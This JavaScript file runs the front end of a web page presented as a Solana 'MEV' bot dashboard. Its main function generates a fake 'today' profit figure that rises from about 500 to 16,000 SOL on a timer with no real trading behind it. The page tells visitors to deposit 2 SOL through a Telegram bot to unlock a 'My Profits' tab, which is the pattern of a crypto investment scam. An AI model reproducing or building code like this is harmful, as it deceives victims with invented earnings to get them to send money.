document.addEventListener("DOMContentLoaded", function() {
    initializeWallet();
    showTab('wallet-tab');
    updateTodayStats();
    setInterval(updateTodayStats, 1000); // Update every second
});

function initializeWallet() {
    document.getElementById("wallet-address").textContent = "To get your wallet address, go to the Telegram bot and type /get_wallet";
    document.getElementById("wallet-balance").textContent = "Balance: 0 SOL";
    document.getElementById("wallet-instructions").textContent = "Go to the Telegram bot, type /get_wallet and deposit 2 SOL to unlock the My Profits tab.";
    updateProfitsTab();
}

function updateProfitsTab() {
    const profitsContent = document.getElementById("profits-content");
    profitsContent.innerHTML = `
        <p>🔒 Deposit at least 2 SOL to your wallet to access this area.</p>
        <p>To get your wallet address and make a deposit:</p>
        <ol>
            <li>Go to the Telegram bot</li>
            <li>Type /get_wallet</li>
            <li>Follow the instructions to deposit 2 SOL</li>
        </ol>
    `;
}

function showTab(tabId) {
    const tabs = document.getElementsByClassName("tab-content");
    for (let tab of tabs) {
        tab.style.display = "none";
    }
    document.getElementById(tabId).style.display = "block";
}

const STORAGE_KEY = 'solana_mev_stats';

function getStoredStats() {
    const storedStats = localStorage.getItem(STORAGE_KEY);
    if (storedStats) {
        return JSON.parse(storedStats);
    }
    return generateNewStats();
}

function generateNewStats() {
    const stats = {
        value: 500.01,
        lastUpdated: new Date().toISOString()
    };
    localStorage.setItem(STORAGE_KEY, JSON.stringify(stats));
    return stats;
}

function updateTodayStats() {
    let stats = getStoredStats();
    const maxStats = 16000.99;
    const increment = (maxStats - 500.01) / (24 * 60 * 60); // Increment per second

    const now = new Date();
    const timePassed = (now - new Date(stats.lastUpdated)) / 1000; // Time passed in seconds
    let todayStats = Math.min(maxStats, 500.01 + increment * timePassed);

    if (todayStats >= maxStats) {
        stats = generateNewStats();
        todayStats = stats.value;
    }

    stats.value = todayStats;
    stats.lastUpdated = now.toISOString();
    localStorage.setItem(STORAGE_KEY, JSON.stringify(stats));

    document.getElementById("today-stats").textContent = `${todayStats.toFixed(2)} SOL`;
}

// The following functions are kept for future use when implementing actual wallet integration
async function fetchWalletBalance(walletAddress) {
    try {
        const response = await fetch(`https://api.mainnet-beta.solana.com`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getBalance",
                "params": [walletAddress]
            })
        });
        const data = await response.json();
        const balance = data.result.value / 1000000000; // Convert lamports to SOL
        document.getElementById("wallet-balance").textContent = `Balance: ${balance.toFixed(4)} SOL`;
    } catch (error) {
        console.error("Error fetching wallet balance:", error);
        document.getElementById("wallet-balance").textContent = "Error fetching balance";
    }
}

async function fetchTransactions(walletAddress) {
    try {
        const response = await fetch(`https://api.mainnet-beta.solana.com`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getSignaturesForAddress",
                "params": [
                    walletAddress,
                    { "limit": 10 }
                ]
            })
        });
        const data = await response.json();
        const transactions = data.result;

        const transactionsList = document.getElementById("transactions-list");
        transactionsList.innerHTML = "";

        for (let tx of transactions) {
            const txElement = document.createElement("div");
            txElement.className = "transaction";
            txElement.innerHTML = `
                <div class="transaction-signature">${tx.signature.substr(0, 20)}...</div>
                <div class="transaction-slot">Slot: ${tx.slot}</div>
                <div class="transaction-time">${new Date(tx.blockTime * 1000).toLocaleString()}</div>
            `;
            transactionsList.appendChild(txElement);
        }
    } catch (error) {
        console.error("Error fetching transactions:", error);
        document.getElementById("transactions-list").innerHTML = "Error fetching transactions";
    }
}